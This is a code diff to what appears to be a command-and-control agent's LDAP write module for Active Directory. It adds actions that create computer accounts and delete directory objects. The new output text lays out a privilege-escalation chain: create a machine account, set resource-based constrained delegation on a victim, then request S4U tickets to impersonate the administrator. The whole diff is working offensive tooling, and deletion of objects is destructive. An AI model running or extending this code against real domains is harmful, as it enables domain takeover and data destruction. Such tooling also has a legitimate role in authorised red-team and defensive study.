@@ -14,7 +14,9 @@ import (
 type LdapWriteCommand struct{}
 
 func (c *LdapWriteCommand) Name() string        { return "ldap-write" }
-func (c *LdapWriteCommand) Description() string { return "Modify Active Directory objects via LDAP" }
+func (c *LdapWriteCommand) Description() string {
+	return "Modify Active Directory objects via LDAP"
+}
 
 type ldapWriteArgs struct {
 	Action   string   `json:"action"`
@@ -32,9 +34,10 @@ type ldapWriteArgs struct {
 }
 
 func (c *LdapWriteCommand) Execute(task structs.Task) structs.CommandResult {
+	allActions := "add-member, remove-member, set-attr, add-attr, remove-attr, set-spn, disable, enable, set-password, add-computer, delete-object"
 	if task.Params == "" {
 		return structs.CommandResult{
-			Output:    "Error: parameters required. Use -action <add-member|remove-member|set-attr|add-attr|remove-attr|set-spn|disable|enable|set-password> -server <DC>",
+			Output:    fmt.Sprintf("Error: parameters required. Use -action <%s> -server <DC>", allActions),
 			Status:    "error",
 			Completed: true,
 		}
@@ -71,10 +74,11 @@ func (c *LdapWriteCommand) Execute(task structs.Task) structs.CommandResult {
 		"add-member": true, "remove-member": true,
 		"set-attr": true, "add-attr": true, "remove-attr": true,
 		"set-spn": true, "disable": true, "enable": true, "set-password": true,
+		"add-computer": true, "delete-object": true,
 	}
 	if !validActions[action] {
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: add-member, remove-member, set-attr, add-attr, remove-attr, set-spn, disable, enable, set-password", args.Action),
+			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: %s", args.Action, allActions),
 			Status:    "error",
 			Completed: true,
 		}
@@ -144,6 +148,10 @@ func (c *LdapWriteCommand) Execute(task structs.Task) structs.CommandResult {
 		return ldapToggleAccount(conn, args, baseDN, false)
 	case "set-password":
 		return ldapSetPassword(conn, args, baseDN)
+	case "add-computer":
+		return ldapAddComputer(conn, args, baseDN)
+	case "delete-object":
+		return ldapDeleteObject(conn, args, baseDN)
 	default:
 		// Unreachable — action is validated before connection
 		return structs.CommandResult{Output: "Unknown action", Status: "error", Completed: true}
@@ -608,6 +616,123 @@ func ldapSetPassword(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs
 			"[+] Target:   %s\n"+
 			"[+] Password: (set successfully)\n"+
 			"[+] Server:   %s\n", targetDN, args.Server),
+		Status:    "success",
+		Completed: true,
+	}
+}
+
+func ldapAddComputer(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
+	if args.Target == "" {
+		return structs.CommandResult{
+			Output:    "Error: -target (computer name, without trailing $) is required",
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	if args.Value == "" {
+		return structs.CommandResult{
+			Output:    "Error: -value (password for the computer account) is required",
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Normalize: ensure sAMAccountName ends with $
+	samName := args.Target
+	if !strings.HasSuffix(samName, "$") {
+		samName = samName + "$"
+	}
+
+	// Computer DN goes in the default Computers container
+	computerDN := fmt.Sprintf("CN=%s,CN=Computers,%s", args.Target, baseDN)
+
+	// Encode password as UTF-16LE with surrounding quotes (AD unicodePwd format)
+	quotedPwd := "\"" + args.Value + "\""
+	utf16Pwd := make([]byte, len(quotedPwd)*2)
+	for i, c := range quotedPwd {
+		utf16Pwd[i*2] = byte(c)
+		utf16Pwd[i*2+1] = 0
+	}
+
+	// WORKSTATION_TRUST_ACCOUNT = 0x1000 (4096)
+	const workstationTrustAccount = "4096"
+
+	addReq := ldap.NewAddRequest(computerDN, nil)
+	addReq.Attribute("objectClass", []string{"top", "person", "organizationalPerson", "user", "computer"})
+	addReq.Attribute("cn", []string{args.Target})
+	addReq.Attribute("sAMAccountName", []string{samName})
+	addReq.Attribute("userAccountControl", []string{workstationTrustAccount})
+	addReq.Attribute("unicodePwd", []string{string(utf16Pwd)})
+
+	// Set DNS hostname if we can infer the domain
+	dnsParts := strings.Split(baseDN, ",")
+	var domainParts []string
+	for _, part := range dnsParts {
+		part = strings.TrimSpace(part)
+		if strings.HasPrefix(strings.ToUpper(part), "DC=") {
+			domainParts = append(domainParts, part[3:])
+		}
+	}
+	if len(domainParts) > 0 {
+		fqdn := strings.ToLower(args.Target) + "." + strings.Join(domainParts, ".")
+		addReq.Attribute("dNSHostName", []string{fqdn})
+	}
+
+	if err := conn.Add(addReq); err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error creating computer account: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	return structs.CommandResult{
+		Output: fmt.Sprintf("[*] LDAP Computer Account Creation (T1136.002)\n"+
+			"[+] DN:            %s\n"+
+			"[+] sAMAccountName: %s\n"+
+			"[+] Password:      (set)\n"+
+			"[+] UAC:           WORKSTATION_TRUST_ACCOUNT (0x1000)\n"+
+			"[+] Server:        %s\n"+
+			"\n[!] Use with RBCD: ldap-write -action set-attr -target <victim> -attr msDS-AllowedToActOnBehalfOfOtherIdentity ...\n"+
+			"[!] Then: ticket -action s4u -target <victim> -impersonate administrator\n",
+			computerDN, samName, args.Server),
+		Status:    "success",
+		Completed: true,
+	}
+}
+
+func ldapDeleteObject(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
+	if args.Target == "" {
+		return structs.CommandResult{
+			Output:    "Error: -target (object to delete — sAMAccountName, CN, or full DN) is required",
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error resolving target: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	delReq := ldap.NewDelRequest(targetDN, nil)
+	if err := conn.Del(delReq); err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error deleting object: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	return structs.CommandResult{
+		Output: fmt.Sprintf("[*] LDAP Object Deletion\n"+
+			"[+] Deleted: %s\n"+
+			"[+] Server:  %s\n", targetDN, args.Server),
 		Status:    "success",
 		Completed: true,
 	}
